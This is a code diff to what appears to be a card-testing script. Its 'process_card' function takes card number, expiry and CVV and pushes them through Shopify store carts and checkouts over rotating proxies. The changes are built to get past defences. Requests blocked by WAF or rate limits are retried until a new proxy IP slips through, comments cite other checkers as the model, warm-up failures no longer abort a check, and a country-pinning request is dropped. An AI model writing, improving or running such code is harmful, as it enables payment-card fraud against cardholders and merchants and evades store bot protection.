@@ -1132,20 +1132,20 @@ async def fetch_cheapest_candidate(session, domain, profile, proxy):
             saw_response = False
             waf_blocked = False
             for base_url in [f"{domain}/products.json", f"{domain}/collections/all/products.json"]:
-                for _try in range(3):
+                for _try in range(5):
                     try:
                         r = await fetch_session.get(base_url, params={"limit": 250}, proxies=proxies, timeout=10)
                         saw_response = True
-                        if r.status_code == 429:
-                            await asyncio.sleep(1.5 + 1.5 * _try)
-                            continue
-                        if r.status_code in (401, 403, 503):
-                            # WAF challenge — this PROXY's IP is flagged, not the store
-                            print(f"[candidates] {base_url} HTTP {r.status_code} (WAF/proxy)")
+                        if r.status_code in (429, 401, 403, 503):
+                            # WAF/rate challenge — rotating proxies exit a NEW IP per
+                            # request, so RETRY (like rukia does) instead of giving up
+                            print(f"[candidates] {base_url} HTTP {r.status_code} (try {_try+1}/5)")
                             waf_blocked = True
-                            break
+                            await asyncio.sleep(0.8 + 0.7 * _try)
+                            continue
                         if r.status_code != 200:
                             print(f"[candidates] {base_url} HTTP {r.status_code}")
+                            waf_blocked = True
                             break
                         text = r.text
                         if "shopify" not in text.lower():
@@ -1581,19 +1581,17 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 warm_headers = build_headers(profile, ourl, for_document=True)
                 xhr_headers = build_headers(profile, ourl, for_document=False)
 
-            warmed = False
+            # warm-up is BEST-EFFORT (matches s4chiz/rukia flow): a slow proxy may
+            # time out here while cart/checkout still work — never abort the check
             for _w in range(2):
                 try:
                     await session.get(ourl, headers=warm_headers, proxy=proxy,
                                       timeout=12, allow_redirects=True)
                     print(f"[warmup] ✅ {time.time()-t0:.2f}s root primed")
-                    warmed = True
                     break
                 except Exception as e:
                     print(f"[warmup] ⚠️ {_w+1}/2 {str(e)[:80]}")
                     await asyncio.sleep(1.0)
-            if not warmed:
-                return False, "Change Proxy", gateway, variant_price_fallback, currency
 
             # 🔥 FIX: Abort if this isn't a Shopify site
             is_shopify = await verify_shopify_store(session, ourl, proxy, profile)
@@ -1638,15 +1636,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             # The old /localization POST 404s on most stores, and IP-geo markets
             # (e.g. IN on US stores) make the seller proposal UnavailableTerms.
             loc_country = "US"
-            try:
-                pin_h = build_headers(profile, ourl, for_document=True)
-                pin_h["referer"] = f"{ourl}/"
-                r_pin = await session.get(
-                    f"{ourl}/?country={loc_country}&currency={currency}",
-                    headers=pin_h, proxy=proxy, timeout=12, allow_redirects=True)
-                print(f"[pin] country={loc_country} currency={currency} → {str(r_pin.url)[:90]}")
-            except Exception as e:
-                print(f"[pin] ⚠️ {str(e)[:80]}")
+            if os.environ.get("SHOPIFY_PIN_DISABLE"):
+                print("[pin] disabled by env")
 
             add_referer = f"{ourl}/products/{product_handle}" if product_handle else f"{ourl}/"
             ok, payload = await storefront_cart_add(
